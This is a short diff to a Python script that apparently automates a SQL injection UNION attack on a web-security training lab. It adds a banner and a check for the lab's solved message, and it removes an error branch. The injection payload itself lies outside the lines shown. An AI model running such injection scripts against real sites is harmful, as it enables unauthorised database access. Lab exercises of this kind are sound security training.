@@ -31,6 +31,7 @@ def exploit(url, num_columns, unique_string):
 
 
 if __name__ == "__main__":
+    print('[+] SQL injection UNION attack, finding a column containing text')
     try:
         host = sys.argv[1].strip().rstrip('/')
         unique_string = sys.argv[2].strip()
@@ -49,5 +50,9 @@ if __name__ == "__main__":
             print(f'[+] Injection successful, string column found at position {string_column}')
         else:
             print('[-] Injection not successful')
-    else:
-        print('[-] Did not detect column count')
+
+        if 'Congratulations, you solved the lab!' not in client.get(f'{host}').text:
+            print(f'[-] Failed to solve lab')
+            sys.exit(-9)
+
+        print(f'[+] Lab solved')
